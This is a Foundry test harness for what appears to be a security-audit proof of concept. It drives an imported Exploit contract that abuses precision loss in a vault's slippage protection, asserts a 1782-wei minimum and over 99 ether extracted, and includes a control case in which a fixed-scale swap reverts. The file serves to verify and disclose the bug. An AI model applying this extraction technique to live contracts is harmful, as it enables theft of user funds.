// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "forge-std/Test.sol";
import {Exploit} from "./43910-c-01-critical-precision-loss-in-slippage-protection-calculat.sol";
contract Finding43910Test is Test {
    function test_exploit_slippage_floor_is_1782_wei() public {
        Exploit e = new Exploit();
        e.run();
        emit log_named_uint("extracted", e.extracted());
        emit log_named_uint("min", e.vault().lastMin());
        emit log_named_uint("out", e.vault().lastOut());
        assertEq(e.vault().lastMin(), 1782, "min");
        assertGt(e.extracted(), 99 ether, "extracted");
    }
    function test_control_1e18_scale_reverts() public {
        Exploit e = new Exploit();
        e.frontRun();
        emit log_named_uint("r0", e.pool().reserve0());
        emit log_named_uint("r1", e.pool().reserve1());
        (bool ok,) = address(e.vault()).call(
            abi.encodeWithSignature("swapFixed(uint256,uint256,uint256,uint256)", e.RESERVE_IN(), 1, 1 ether, block.timestamp)
        );
        emit log_named_uint("fixedOk", ok ? 1 : 0);
        assertFalse(ok, "fixed scale must revert");
    }
}
